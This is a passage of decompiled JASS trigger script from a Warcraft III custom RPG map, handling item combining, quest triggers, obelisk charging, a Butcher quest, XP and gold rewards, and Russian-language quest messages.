endif
else
endif
if BHa() then
if BHY() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303135))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303131))
call UnitAddItemByIdSwapped($49303136,GetManipulatingUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetManipulatingUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
endif
else
endif
endfunction
function BHc takes nothing returns nothing
set ZT=CreateTrigger()
call DisableTrigger(ZT)
call TriggerRegisterAnyUnitEventBJ(ZT,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(ZT,function BHb)
endfunction
function BHd takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetManipulatingUnit(),$49303131)==true) then
return false
endif
return true
endfunction
function BHe takes nothing returns boolean
if not BHd() then
return false
endif
return true
endfunction
function BHf takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303137) then
return false
endif
return true
endfunction
function BHg takes nothing returns boolean
if not BHf() then
return false
endif
return true
endfunction
function BHh takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetManipulatingUnit(),$49303131)==true) then
return false
endif
return true
endfunction
function BHi takes nothing returns boolean
if not BHh() then
return false
endif
return true
endfunction
function BHj takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303132) then
return false
endif
return true
endfunction
function BHk takes nothing returns boolean
if not BHj() then
return false
endif
return true
endfunction
function BHl takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetManipulatingUnit(),$49303131)==true) then
return false
endif
return true
endfunction
function BHm takes nothing returns boolean
if not BHl() then
return false
endif
return true
endfunction
function BHn takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303133) then
return false
endif
return true
endfunction
function BHo takes nothing returns boolean
if not BHn() then
return false
endif
return true
endfunction
function BHp takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetManipulatingUnit(),$49303131)==true) then
return false
endif
return true
endfunction
function BHq takes nothing returns boolean
if not BHp() then
return false
endif
return true
endfunction
function BHr takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303134) then
return false
endif
return true
endfunction
function BHs takes nothing returns boolean
if not BHr() then
return false
endif
return true
endfunction
function BHt takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetManipulatingUnit(),$49303131)==true) then
return false
endif
return true
endfunction
function BHu takes nothing returns boolean
if not BHt() then
return false
endif
return true
endfunction
function BHv takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303135) then
return false
endif
return true
endfunction
function BHw takes nothing returns boolean
if not BHv() then
return false
endif
return true
endfunction
function BHx takes nothing returns nothing
if BHg() then
if BHe() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303131))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303137))
call UnitAddItemByIdSwapped($49303132,GetManipulatingUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetManipulatingUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
endif
else
endif
if BHk() then
if BHi() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303132))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303131))
call UnitAddItemByIdSwapped($49303133,GetManipulatingUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetManipulatingUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
endif
else
endif
if BHo() then
if BHm() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303133))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303131))
call UnitAddItemByIdSwapped($49303134,GetManipulatingUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetManipulatingUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
endif
else
endif
if BHs() then
if BHq() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303134))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303131))
call UnitAddItemByIdSwapped($49303135,GetManipulatingUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetManipulatingUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
endif
else
endif
if BHw() then
if BHu() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303135))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetManipulatingUnit(),$49303131))
call UnitAddItemByIdSwapped($49303136,GetManipulatingUnit())
call AddSpecialEffectLocBJ(GetUnitLoc(GetManipulatingUnit()),"Abilities\\Spells\\Items\\AIem\\AIemTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
else
endif
else
endif
endfunction
function BHy takes nothing returns nothing
set ZU=CreateTrigger()
call DisableTrigger(ZU)
call TriggerRegisterAnyUnitEventBJ(ZU,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(ZU,function BHx)
endfunction
function BHz takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303136))==true) then
return false
endif
return true
endfunction
function BH0 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BH1 takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BH2 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BH3 takes nothing returns boolean
return GetBooleanAnd(BH1(),BH2())
endfunction
function BH4 takes nothing returns boolean
return GetBooleanAnd(BH0(),BH3())
endfunction
function BH5 takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=22) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=26) then
return false
endif
return true
endfunction
function BH6 takes nothing returns nothing
if BH5() then
call AddHeroXP(GetEnumUnit(),1800,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+1800
else
endif
endfunction
function BH7 takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=23) then
return false
endif
return true
endfunction
function BH8 takes nothing returns nothing
call DestroyEffectBJ(Us[14])
call DisableTrigger(GetTriggeringTrigger())
call DisableTrigger(ZS)
call DisableTrigger(ZT)
call DisableTrigger(ZU)
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303136))
call QuestSetCompletedBJ(YX[14],true)
call DestroyQuest(YX[14])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BH4))
call ForGroupBJ(Th,function BH6)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF1800 опыта|r, |c00ffff00250 золота|r, |c00ff96963 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BH7() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+750
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+9
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BH9 takes nothing returns nothing
set ZW=CreateTrigger()
call TriggerRegisterEnterRectSimple(ZW,o)
call TriggerAddCondition(ZW,Condition(function BHz))
call TriggerAddAction(ZW,function BH8)
endfunction
function BIB takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E303056) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BIC takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=23) then
return false
endif
return true
endfunction
function BID takes nothing returns nothing
if BIC() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call DestroyEffectBJ(Us[15])
call AddSpecialEffectTargetUnitBJ("overhead",Ik,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[15]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Гроза Тропиков \".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 23-26|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Гроза Тропиков","Хотите дальше?? Хе-хе, все хотят. А Вы докажите, что достойны увидеть то, что скрывается за эти порталом! Принесите мне |c00FFFF00Желтый Крисстал|r!
|c006969FFУровень задания: 2","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[15]=GetLastCreatedQuestBJ()
call ShowUnitShow(LX)
call PauseUnitBJ(false,LX)
else
call ne(GetTriggerUnit(),"Задание с |c00ff000023|r уровня",.027,255,255,255)
endif
endfunction
function BIE takes nothing returns nothing
set ZX=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ZX,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(ZX,Condition(function BIB))
call TriggerAddAction(ZX,function BID)
endfunction
function BIF takes nothing returns boolean
if not (GetDyingUnit()==LX) then
return false
endif
return true
endfunction
function BIG takes nothing returns nothing
set ZV[2]=GetUnitLoc(GetDyingUnit())
call CreateItemLoc($49303138,ZV[2])
call CreateItemLoc($49303447,ZV[2])
call DisableTrigger(GetTriggeringTrigger())
call RemoveLocation(ZV[2])
endfunction
function BIH takes nothing returns nothing
set ZY=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ZY,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(ZY,Condition(function BIF))
call TriggerAddAction(ZY,function BIG)
endfunction
function BII takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303138))==true) then
return false
endif
return true
endfunction
function BIJ takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BIK takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BIL takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BIM takes nothing returns boolean
return GetBooleanAnd(BIK(),BIL())
endfunction
function BIN takes nothing returns boolean
return GetBooleanAnd(BIJ(),BIM())
endfunction
function BIO takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=23) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=26) then
return false
endif
return true
endfunction
function BIP takes nothing returns nothing
if BIO() then
call AddHeroXP(GetEnumUnit(),3000,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+3000
else
endif
endfunction
function BIQ takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=23) then
return false
endif
return true
endfunction
function BIR takes nothing returns nothing
call EnableTrigger(Za)
call DestroyEffectBJ(Us[15])
call AddSpecialEffectTargetUnitBJ("overhead",Ik,"war3mapImported\\QuestYellow0.mdx")
set Us[15]=GetLastCreatedEffectBJ()
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303138))
call QuestSetCompletedBJ(YX[15],true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FFFF00Путь дальше открыт!|r")
call DestroyQuest(YX[15])
call ModifyGateBJ(bj_GATEOPERATION_OPEN,Hn)
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BIN))
call ForGroupBJ(Th,function BIP)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3000 опыта|r, |c00ffff00300 золота|r, |c00ff96968 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BIQ() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+900
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+24
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BIS takes nothing returns nothing
set ZZ=CreateTrigger()
call TriggerRegisterEnterRectSimple(ZZ,p)
call TriggerAddCondition(ZZ,Condition(function BII))
call TriggerAddAction(ZZ,function BIR)
endfunction
function BIT takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E303056) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BIU takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=24) then
return false
endif
return true
endfunction
function BIV takes nothing returns nothing
if BIU() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Zb)
call EnableTrigger(Zc)
call EnableTrigger(Zd)
call EnableTrigger(Ze)
call DestroyEffectBJ(Us[15])
call AddSpecialEffectTargetUnitBJ("overhead",Ik,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[15]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Обелиски \".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 24-26|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Обелиски","|c006969FFУровень задания: 24-26|r
В недрях этих Джунглей стоит 4 Обелиска. Зарядите каждый из них душами, дабы они смогли излучать светлую магию, и приходите ко мне за наградой. Да, кстати, каждому обелиску требуется около 5 душ для подзарядки.","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[15]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000024|r уровня",.027,255,255,255)
endif
endfunction
function BIW takes nothing returns nothing
set Za=CreateTrigger()
call DisableTrigger(Za)
call TriggerRegisterAnyUnitEventBJ(Za,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Za,Condition(function BIT))
call TriggerAddAction(Za,function BIV)
endfunction
function BIX takes nothing returns boolean
if not (RectContainsUnit(E3,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BIY takes nothing returns boolean
if not (TW[0]>=4) then
return false
endif
return true
endfunction
function BIZ takes nothing returns boolean
if not (TW[1]>=5) then
return false
endif
return true
endfunction
function BIa takes nothing returns nothing
set TW[1]=TW[1]+1
if BIZ() then
call DisableTrigger(GetTriggeringTrigger())
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Обелиск заряжен!")
call SetUnitAnimation(Jy,"stand work")
set TW[0]=TW[0]+1
if BIY() then
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Все Обелиски заряжены. Вернитесь за наградой.")
call EnableTrigger(Zf)
call DestroyEffectBJ(Us[15])
call AddSpecialEffectTargetUnitBJ("overhead",Ik,"war3mapImported\\QuestYellow1.mdx")
set Us[15]=GetLastCreatedEffectBJ()
else
endif
else
endif
endfunction
function BIb takes nothing returns nothing
set Zb=CreateTrigger()
call DisableTrigger(Zb)
call TriggerRegisterAnyUnitEventBJ(Zb,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Zb,Condition(function BIX))
call TriggerAddAction(Zb,function BIa)
endfunction
function BIc takes nothing returns boolean
if not (RectContainsUnit(E4,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BId takes nothing returns boolean
if not (TW[0]>=4) then
return false
endif
return true
endfunction
function BIe takes nothing returns boolean
if not (TW[2]>=5) then
return false
endif
return true
endfunction
function BIf takes nothing returns nothing
set TW[2]=TW[2]+1
if BIe() then
call DisableTrigger(GetTriggeringTrigger())
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Обелиск заряжен!")
call SetUnitAnimation(Jw,"stand work")
set TW[0]=TW[0]+1
if BId() then
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Все Обелиски заряжены. Вернитесь за наградой.")
call EnableTrigger(Zf)
call DestroyEffectBJ(Us[15])
call AddSpecialEffectTargetUnitBJ("overhead",Ik,"war3mapImported\\QuestYellow1.mdx")
set Us[15]=GetLastCreatedEffectBJ()
else
endif
else
endif
endfunction
function BIg takes nothing returns nothing
set Ze=CreateTrigger()
call DisableTrigger(Ze)
call TriggerRegisterAnyUnitEventBJ(Ze,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Ze,Condition(function BIc))
call TriggerAddAction(Ze,function BIf)
endfunction
function BIh takes nothing returns boolean
if not (RectContainsUnit(E5,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BIi takes nothing returns boolean
if not (TW[0]>=4) then
return false
endif
return true
endfunction
function BIj takes nothing returns boolean
if not (TW[3]>=5) then
return false
endif
return true
endfunction
function BIk takes nothing returns nothing
set TW[3]=TW[3]+1
if BIj() then
call DisableTrigger(GetTriggeringTrigger())
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Обелиск заряжен!")
call SetUnitAnimation(Jv,"stand work")
set TW[0]=TW[0]+1
if BIi() then
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Все Обелиски заряжены. Вернитесь за наградой.")
call EnableTrigger(Zf)
call DestroyEffectBJ(Us[15])
call AddSpecialEffectTargetUnitBJ("overhead",Ik,"war3mapImported\\QuestYellow1.mdx")
set Us[15]=GetLastCreatedEffectBJ()
else
endif
else
endif
endfunction
function BIl takes nothing returns nothing
set Zc=CreateTrigger()
call DisableTrigger(Zc)
call TriggerRegisterAnyUnitEventBJ(Zc,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Zc,Condition(function BIh))
call TriggerAddAction(Zc,function BIk)
endfunction
function BIm takes nothing returns boolean
if not (RectContainsUnit(FD,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BIn takes nothing returns boolean
if not (TW[0]>=4) then
return false
endif
return true
endfunction
function BIo takes nothing returns boolean
if not (TW[4]>=5) then
return false
endif
return true
endfunction
function BIp takes nothing returns nothing
set TW[4]=TW[4]+1
if BIo() then
call DisableTrigger(GetTriggeringTrigger())
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Обелиск заряжен!")
call SetUnitAnimation(Jx,"stand work")
set TW[0]=TW[0]+1
if BIn() then
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Все Обелиски заряжены. Вернитесь за наградой.")
call EnableTrigger(Zf)
call DestroyEffectBJ(Us[15])
call AddSpecialEffectTargetUnitBJ("overhead",Ik,"war3mapImported\\QuestYellow1.mdx")
set Us[15]=GetLastCreatedEffectBJ()
else
endif
else
endif
endfunction
function BIq takes nothing returns nothing
set Zd=CreateTrigger()
call DisableTrigger(Zd)
call TriggerRegisterAnyUnitEventBJ(Zd,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Zd,Condition(function BIm))
call TriggerAddAction(Zd,function BIp)
endfunction
function BIr takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E303056) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BIs takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BIt takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BIu takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BIv takes nothing returns boolean
return GetBooleanAnd(BIt(),BIu())
endfunction
function BIw takes nothing returns boolean
return GetBooleanAnd(BIs(),BIv())
endfunction
function BIx takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=24) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=26) then
return false
endif
return true
endfunction
function BIy takes nothing returns nothing
if BIx() then
call AddHeroXP(GetEnumUnit(),3000,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+3000
else
endif
endfunction
function BIz takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=24) then
return false
endif
return true
endfunction
function BI0 takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=24) then
return false
endif
return true
endfunction
function BI1 takes nothing returns nothing
if BI0() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call UnitAddAbilityBJ($416E6575,GetOrderTargetUnit())
call DestroyEffectBJ(Us[15])
call QuestSetCompletedBJ(YX[15],true)
call DestroyQuest(YX[15])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BIw))
call ForGroupBJ(Th,function BIy)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3000 опыта|r, |c00ffff00300 золота|r, |c00ff96968 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BIz() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+900
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+24
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000024|r уровня",.027,255,255,255)
endif
endfunction
function BI2 takes nothing returns nothing
set Zf=CreateTrigger()
call DisableTrigger(Zf)
call TriggerRegisterAnyUnitEventBJ(Zf,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Zf,Condition(function BIr))
call TriggerAddAction(Zf,function BI1)
endfunction
function BI3 takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$75736864) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BI4 takes nothing returns nothing
call EnableTrigger(Zh)
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call EnableTrigger(Zi)
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[16])
call AddSpecialEffectTargetUnitBJ("overhead",In,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[16]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Свежее Мясо \".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 25-28|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Свежее мясо","Чтобы получить желаемое, прийдется попотеть. Попробуйте-ка убить |c007d7d7dМясника!|r

|c006969FFУровень задания: 25-28|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[16]=GetLastCreatedQuestBJ()
endfunction
function BI5 takes nothing returns nothing
set Zg=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Zg,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Zg,Condition(function BI3))
call TriggerAddAction(Zg,function BI4)
endfunction
function BI6 takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BI7 takes nothing returns nothing
set YV[29]=GetRectCenter(v)
call SetUnitPositionLoc(GetEnteringUnit(),YV[29])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[29],0)
call RemoveLocation(YV[29])
endfunction
function BI8 takes nothing returns nothing
set Zh=CreateTrigger()
call DisableTrigger(Zh)
call TriggerRegisterEnterRectSimple(Zh,w)
call TriggerAddCondition(Zh,Condition(function BI6))
call TriggerAddAction(Zh,function BI7)
endfunction
function BI9 takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BJB takes nothing returns nothing
set YV[30]=GetRectCenter(Fg)
call SetUnitPositionLoc(GetEnteringUnit(),YV[30])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[30],0)
call RemoveLocation(YV[30])
endfunction
function BJC takes nothing returns nothing
set Zi=CreateTrigger()
call DisableTrigger(Zi)
call TriggerRegisterEnterRectSimple(Zi,u)
call TriggerAddCondition(Zi,Condition(function BI9))
call TriggerAddAction(Zi,function BJB)
endfunction
function BJD takes nothing returns boolean
if not (GetUnitTypeId(GetDyingUnit())==$75303034) then
return false
endif
return true
endfunction
function BJE takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Zk)
call EnableTrigger(Zl)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00ffff00Наглус|r: Мясник оказался не так прост, как мы думали. Он подстроил свою смерть, хотя на самом деле просто перенесся в другое убежище, получив новые силы! Убейте его в конце конце концов")
endfunction
function BJF takes nothing returns nothing
set Zj=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Zj,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Zj,Condition(function BJD))
call TriggerAddAction(Zj,function BJE)
endfunction
function BJG takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BJH takes nothing returns nothing
set YV[31]=GetRectCenter(Y)
call SetUnitPositionLoc(GetEnteringUnit(),YV[31])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[31],0)
call RemoveLocation(YV[31])
endfunction
function BJI takes nothing returns nothing
set Zk=CreateTrigger()
call DisableTrigger(Zk)
call TriggerRegisterEnterRectSimple(Zk,s)
call TriggerAddCondition(Zk,Condition(function BJG))
call TriggerAddAction(Zk,function BJH)
endfunction
function BJJ takes nothing returns boolean
if not (IsUnitType(GetEnteringUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BJK takes nothing returns nothing
set YV[32]=GetRectCenter(t)
call SetUnitPositionLoc(GetEnteringUnit(),YV[32])
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),YV[32],0)
call RemoveLocation(YV[32])
endfunction
function BJL takes nothing returns nothing
set Zl=CreateTrigger()
call DisableTrigger(Zl)
call TriggerRegisterEnterRectSimple(Zl,r)
call TriggerAddCondition(Zl,Condition(function BJJ))
call TriggerAddAction(Zl,function BJK)
endfunction
function BJM takes nothing returns boolean
if not (GetUnitTypeId(GetDyingUnit())==$75303035) then
return false
endif
return true
endfunction
function BJN takes nothing returns nothing
call DestroyEffectBJ(Us[16])
set YV[33]=GetUnitLoc(GetTriggerUnit())
call CreateItemLoc($49303932,YV[33])
call CreateItemLoc($49303932,YV[33])
call CreateItemLoc($49303932,YV[33])
call AddSpecialEffectTargetUnitBJ("overhead",In,"war3mapImported\\QuestYellow1.mdx")
set Us[16]=GetLastCreatedEffectBJ()
call EnableTrigger(Zn)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Мясник в который раз умирает. Возвращайтесь к Наглусу!")
call RemoveLocation(YV[33])
endfunction
function BJO takes nothing returns nothing
set Zm=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Zm,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(Zm,Condition(function BJM))
call TriggerAddAction(Zm,function BJN)
endfunction
function BJP takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$75736864) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BJQ takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BJR takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BJS takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BJT takes nothing returns boolean
return GetBooleanAnd(BJR(),BJS())
endfunction
function BJU takes nothing returns boolean
return GetBooleanAnd(BJQ(),BJT())
endfunction
function BJV takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=25) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=28) then
return false
endif
return true
endfunction
function BJW takes nothing returns nothing
if BJV() then
call AddHeroXP(GetEnumUnit(),3800,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2800
else
